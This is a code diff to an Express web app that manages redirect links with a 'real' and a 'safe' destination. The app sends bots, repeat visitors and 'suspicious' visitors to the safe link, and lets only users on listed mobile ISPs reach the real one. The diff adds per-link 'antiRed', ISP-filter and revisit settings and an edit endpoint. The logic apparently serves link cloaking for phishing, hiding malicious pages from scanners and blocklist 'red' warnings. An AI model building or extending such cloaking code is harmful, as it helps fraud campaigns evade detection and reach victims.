@@ -205,7 +205,7 @@ app.get('/api/links', requireAuth, asyncHandler(async (req, res) => {
 }));
 
 app.post('/api/links', requireAuth, asyncHandler(async (req, res) => {
-    const { name, realLink, nonRealLink, slug } = req.body;
+    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited } = req.body;
     if (!name || !realLink || !nonRealLink) {
         return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
     }
@@ -229,6 +229,10 @@ app.post('/api/links', requireAuth, asyncHandler(async (req, res) => {
         realLink,
         nonRealLink,
         slug: newSlug,
+        antiRed: antiRed !== undefined ? antiRed : true,
+        ispFilter: ispFilter !== undefined ? ispFilter : true,
+        mobileIsps: mobileIsps || req.user.settings.mobileIsps,
+        reallowVisited: reallowVisited !== undefined ? reallowVisited : true,
         createdAt: new Date().toISOString()
     };
 
@@ -244,6 +248,48 @@ app.delete('/api/links/:slug', requireAuth, asyncHandler(async (req, res) => {
     const updatedLinks = (req.user.links || []).filter(l => l.slug !== slug);
     await db.updateUser(req.user.id, { links: updatedLinks });
     res.json({ message: 'Link deleted' });
+}));
+
+app.put('/api/links/:oldSlug', requireAuth, asyncHandler(async (req, res) => {
+    const { oldSlug } = req.params;
+    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited } = req.body;
+
+    if (!name || !realLink || !nonRealLink) {
+        return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
+    }
+
+    const newSlug = slug || oldSlug;
+
+    // Validate slug
+    if (newSlug && !/^[a-zA-Z0-9-]+$/.test(newSlug)) {
+        return res.status(400).json({ error: 'Slug can only contain letters, numbers, and dashes' });
+    }
+
+    // Check if new slug is taken by another user/link
+    if (newSlug !== oldSlug) {
+        const existing = await db.findUserBySlug(newSlug);
+        if (existing) return res.status(400).json({ error: 'New slug already in use' });
+    }
+
+    const links = req.user.links || [];
+    const index = links.findIndex(l => l.slug === oldSlug);
+    if (index === -1) return res.status(404).json({ error: 'Link not found' });
+
+    links[index] = {
+        ...links[index],
+        name,
+        realLink,
+        nonRealLink,
+        slug: newSlug,
+        antiRed: antiRed !== undefined ? antiRed : links[index].antiRed,
+        ispFilter: ispFilter !== undefined ? ispFilter : links[index].ispFilter,
+        mobileIsps: mobileIsps !== undefined ? mobileIsps : links[index].mobileIsps,
+        reallowVisited: reallowVisited !== undefined ? reallowVisited : links[index].reallowVisited,
+        updatedAt: new Date().toISOString()
+    };
+
+    await db.updateUser(req.user.id, { links });
+    res.json(links[index]);
 }));
 
 app.delete('/api/forced-ips/:ip', requireAuth, asyncHandler(async (req, res) => {
@@ -331,6 +377,10 @@ async function handleRedirection(user, req, res, linkData) {
 
     const realLink = linkData.realLink || settings.realLink;
     const nonRealLink = linkData.nonRealLink || settings.nonRealLink;
+    const useAntiRed = linkData.antiRed !== undefined ? linkData.antiRed : settings.antiRed;
+    const useIspFilter = linkData.ispFilter !== undefined ? linkData.ispFilter : settings.ispFilter;
+    const useMobileIsps = linkData.mobileIsps || settings.mobileIsps;
+    const useReallowVisited = linkData.reallowVisited !== undefined ? linkData.reallowVisited : settings.reallowVisited;
 
     if (isBot(req)) {
         return res.redirect(nonRealLink || '/');
@@ -343,7 +393,7 @@ async function handleRedirection(user, req, res, linkData) {
 
     // 2. Visited IP Check
     const isVisited = visitedIps.some(v => v.ip === clientIp);
-    if (isVisited && !settings.reallowVisited) {
+    if (isVisited && !useReallowVisited) {
         return res.redirect(nonRealLink);
     }
 
@@ -363,11 +413,11 @@ async function handleRedirection(user, req, res, linkData) {
     // 4. Filtering Logic
     let targetUrl = realLink;
 
-    if (settings.antiRed && isSuspicious) {
+    if (useAntiRed && isSuspicious) {
         targetUrl = nonRealLink;
-    } else if (settings.ispFilter && data && data.status === 'success') {
+    } else if (useIspFilter && data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
-        const matches = settings.mobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
+        const matches = useMobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
         if (!matches) {
             targetUrl = nonRealLink;
         }
